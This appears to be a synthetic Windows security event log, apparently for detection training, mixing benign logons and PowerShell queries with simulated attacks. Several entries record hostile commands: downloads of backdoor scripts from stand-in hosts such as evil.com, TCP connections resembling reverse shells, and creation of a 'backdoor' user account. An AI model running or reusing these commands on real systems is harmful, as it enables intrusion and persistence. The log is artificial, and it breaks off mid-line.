2025-05-16 00:01:00, Info, CBS, EventID: 4624, TargetUserName: Administrator, IpAddress: 127.0.0.1, WorkstationName: SRV01, ProcessName: -, EventDescription: Successful Logon (Local), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:17, Info, CBS, EventID: 1, TargetUserName: IEUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\notepad.exe, EventDescription: Sysmon Process Create, ScriptContent: C:\Windows\System32\notepad.exe, SourcePort: -, DestinationPort: -
2025-05-16 00:01:18, Info, CSI, EventID: 4104, TargetUserName: TestUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: Get-WmiObject -Class Win32_ComputerSystem, SourcePort: -, DestinationPort: -
2025-05-16 00:01:19, Warning, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.201, WorkstationName: BOTNET-PC02, ProcessName: -, EventDescription: Network Connection (Potential DDoS), ScriptContent: -, SourcePort: 54325, DestinationPort: 80
2025-05-16 00:01:20, Info, CBS, EventID: 4624, TargetUserName: LocalUser, IpAddress: 192.168.1.20, WorkstationName: WKSTN02, ProcessName: -, EventDescription: Successful Logon (Network), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:21, Error, CBS, EventID: 4625, TargetUserName: Administrator, IpAddress: 203.0.113.10, WorkstationName: ATTACKER-WK02, ProcessName: -, EventDescription: Failed Logon Attempt (Invalid Password), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:22, Warning, CSI, EventID: 4104, TargetUserName: IEUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: Invoke-WebRequest -Uri http://evil.com/backdoor.ps1 -OutFile C:\Temp\backdoor.ps1, SourcePort: -, DestinationPort: -
2025-05-16 00:01:23, Warning, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.200, WorkstationName: BOTNET-PC01, ProcessName: -, EventDescription: Network Connection (Potential DDoS), ScriptContent: -, SourcePort: 54326, DestinationPort: 80
2025-05-16 00:01:24, Error, CBS, EventID: 4625, TargetUserName: TestUser, IpAddress: 10.0.2.15, WorkstationName: PC01, ProcessName: -, EventDescription: Failed Logon Attempt (Invalid Username), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:25, Info, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.10, WorkstationName: WKSTN01, ProcessName: -, EventDescription: Network Connection (RDP), ScriptContent: -, SourcePort: 54327, DestinationPort: 3389
2025-05-16 00:01:26, Warning, CSI, EventID: 4104, TargetUserName: TestUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: New-Object System.Net.Sockets.TCPClient('192.168.1.2',6666), SourcePort: -, DestinationPort: -
2025-05-16 00:01:27, Info, CBS, EventID: 4624, TargetUserName: Administrator, IpAddress: 127.0.0.1, WorkstationName: SRV01, ProcessName: -, EventDescription: Successful Logon (Local), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:28, Warning, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.201, WorkstationName: BOTNET-PC02, ProcessName: -, EventDescription: Network Connection (Potential DDoS), ScriptContent: -, SourcePort: 54328, DestinationPort: 80
2025-05-16 00:01:29, Error, CBS, EventID: 4625, TargetUserName: Guest, IpAddress: 172.16.0.50, WorkstationName: REMOTE-PC01, ProcessName: -, EventDescription: Failed Logon Attempt (Account Disabled), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:30, Info, CSI, EventID: 4104, TargetUserName: IEUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: Get-EventLog -LogName System | Where-Object {$_.EventID -eq 6009}, SourcePort: -, DestinationPort: -
2025-05-16 00:01:31, Warning, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.200, WorkstationName: BOTNET-PC01, ProcessName: -, EventDescription: Network Connection (Potential DDoS), ScriptContent: -, SourcePort: 54329, DestinationPort: 80
2025-05-16 00:01:32, Error, CBS, EventID: 4625, TargetUserName: Administrator, IpAddress: 192.168.1.100, WorkstationName: ATTACKER-WK01, ProcessName: -, EventDescription: Failed Logon Attempt (Invalid Password), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:33, Info, CBS, EventID: 1, TargetUserName: IEUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\cmd.exe, EventDescription: Sysmon Process Create, ScriptContent: C:\Windows\System32\cmd.exe /c net user backdoor /add, SourcePort: -, DestinationPort: -
2025-05-16 00:01:34, Info, CSI, EventID: 4104, TargetUserName: TestUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: Invoke-Command -ScriptBlock {Get-Process} -ComputerName SRV03, SourcePort: -, DestinationPort: -
2025-05-16 00:01:35, Warning, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.201, WorkstationName: BOTNET-PC02, ProcessName: -, EventDescription: Network Connection (Potential DDoS), ScriptContent: -, SourcePort: 54330, DestinationPort: 80
2025-05-16 00:01:36, Info, CBS, EventID: 4624, TargetUserName: LocalUser, IpAddress: 192.168.1.20, WorkstationName: WKSTN02, ProcessName: -, EventDescription: Successful Logon (Network), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:37, Error, CBS, EventID: 4625, TargetUserName: TestUser, IpAddress: 203.0.113.10, WorkstationName: ATTACKER-WK02, ProcessName: -, EventDescription: Failed Logon Attempt (Invalid Username), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:38, Warning, CSI, EventID: 4104, TargetUserName: IEUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: Invoke-WebRequest -Uri http://malware.net/payload3.ps1 -OutFile C:\Temp\payload3.ps1, SourcePort: -, DestinationPort: -
2025-05-16 00:01:39, Warning, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.200, WorkstationName: BOTNET-PC01, ProcessName: -, EventDescription: Network Connection (Potential DDoS), ScriptContent: -, SourcePort: 54331, DestinationPort: 80
2025-05-16 00:01:40, Error, CBS, EventID: 4625, TargetUserName: Guest, IpAddress: 172.16.0.50, WorkstationName: REMOTE-PC01, ProcessName: -, EventDescription: Failed Logon Attempt (Account Disabled), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:41, Info, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.10, WorkstationName: WKSTN01, ProcessName: -, EventDescription: Network Connection (HTTP Request), ScriptContent: -, SourcePort: 54332, DestinationPort: 80
2025-05-16 00:01:42, Warning, CSI, EventID: 4104, TargetUserName: TestUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: New-Object System.Net.Sockets.TCPClient('192.168.1.2',7777), SourcePort: -, DestinationPort: -
2025-05-16 00:01:43, Info, CBS, EventID: 4624, TargetUserName: Administrator, IpAddress: 127.0.0.1, WorkstationName: SRV01, ProcessName: -, EventDescription: Successful Logon (Local), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:44, Warning, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.201, WorkstationName: BOTNET-PC02, ProcessName: -, EventDescription: Network Connection (Potential DDoS), ScriptContent: -, SourcePort: 54333, DestinationPort: 80
2025-05-16 00:01:45, Error, CBS, EventID: 4625, TargetUserName: Administrator, IpAddress: 192.168.1.100, WorkstationName: ATTACKER-WK01, ProcessName: -, EventDescription: Failed Logon Attempt (Invalid Password), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:46, Info, CSI, EventID: 4104, TargetUserName: IEUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: Get-NetAdapter, SourcePort: -, DestinationPort: -
2025-05-16 00:01:47, Warning, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.200, WorkstationName: BOTNET-PC01, ProcessName: -, EventDescription: Network Connection (Potential DDoS), ScriptContent: -, SourcePort: 54334, DestinationPort: 80
2025-05-16 00:01:48, Error, CBS, EventID: 4625, TargetUserName: TestUser, IpAddress: 203.0.113.10, WorkstationName: ATTACKER-WK02, ProcessName: -, EventDescription: Failed Logon Attempt (Invalid Username), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:49, Info, CBS, EventID: 1, TargetUserName: IEUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\net.exe, EventDescription: Sysmon Process Create, ScriptContent: C:\Windows\System32\net.exe start malicious_service, SourcePort: -, DestinationPort: -
2025-05-16 00:01:50, Warning, CSI, EventID: 4104, TargetUserName: TestUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: Invoke-WebRequest -Uri http://evil.net/backdoor4.ps1 -OutFile C:\Temp\backdoor4.ps1, SourcePort: -, DestinationPort: -
2025-05-16 00:01:51, Warning, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.201, WorkstationName: BOTNET-PC02, ProcessName: -, EventDescription: Network Connection (Potential DDoS), ScriptContent: -, SourcePort: 54335, DestinationPort: 80
2025-05-16 00:01:52, Info, CBS, EventID: 4624, TargetUserName: LocalUser, IpAddress: 192.168.1.20, WorkstationName: WKSTN02, ProcessName: -, EventDescription: Successful Logon (Network), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:53, Error, CBS, EventID: 4625, TargetUserName: Guest, IpAddress: 172.16.0.50, WorkstationName: REMOTE-PC01, ProcessName: -, EventDescription: Failed Logon Attempt (Account Disabled), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:54, Info, CSI, EventID: 4104, TargetUserName: IEUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: Get-Disk, SourcePort: -, DestinationPort: -
2025-05-16 00:01:55, Warning, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.200, WorkstationName: BOTNET-PC01, ProcessName: -, EventDescription: Network Connection (Potential DDoS), ScriptContent: -, SourcePort: 54336, DestinationPort: 80
2025-05-16 00:01:56, Error, CBS, EventID: 4625, TargetUserName: Administrator, IpAddress: 192.168.1.100, WorkstationName: ATTACKER-WK01, ProcessName: -, EventDescription: Failed Logon Attempt (Invalid Password), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:01:57, Info, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.10, WorkstationName: WKSTN01, ProcessName: -, EventDescription: Network Connection (RDP), ScriptContent: -, SourcePort: 54337, DestinationPort: 3389
2025-05-16 00:01:58, Warning, CSI, EventID: 4104, TargetUserName: TestUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: New-Object System.Net.Sockets.TCPClient('192.168.1.2',8888), SourcePort: -, DestinationPort: -
2025-05-16 00:01:59, Info, CBS, EventID: 4624, TargetUserName: Administrator, IpAddress: 127.0.0.1, WorkstationName: SRV01, ProcessName: -, EventDescription: Successful Logon (Local), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:02:00, Warning, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.201, WorkstationName: BOTNET-PC02, ProcessName: -, EventDescription: Network Connection (Potential DDoS), ScriptContent: -, SourcePort: 54338, DestinationPort: 80
2025-05-16 00:02:01, Error, CBS, EventID: 4625, TargetUserName: Guest, IpAddress: 172.16.0.50, WorkstationName: REMOTE-PC01, ProcessName: -, EventDescription: Failed Logon Attempt (Account Disabled), ScriptContent: -, SourcePort: -, DestinationPort: -
2025-05-16 00:02:02, Warning, CSI, EventID: 4104, TargetUserName: IEUser, IpAddress: -, WorkstationName: SRV01, ProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, EventDescription: PowerShell Script Execution, ScriptContent: Invoke-WebRequest -Uri http://malware.net/payload5.ps1 -OutFile C:\Temp\payload5.ps1, SourcePort: -, DestinationPort: -
2025-05-16 00:02:03, Warning, CBS, EventID: 5156, TargetUserName: -, IpAddress: 192.168.1.200, WorkstationName: BOTNET-PC01, ProcessName: -, EventDescription: Network Connection (Potential DDoS), ScriptContent: -, SourcePort: 54339, DestinationPort: 80
2025-05
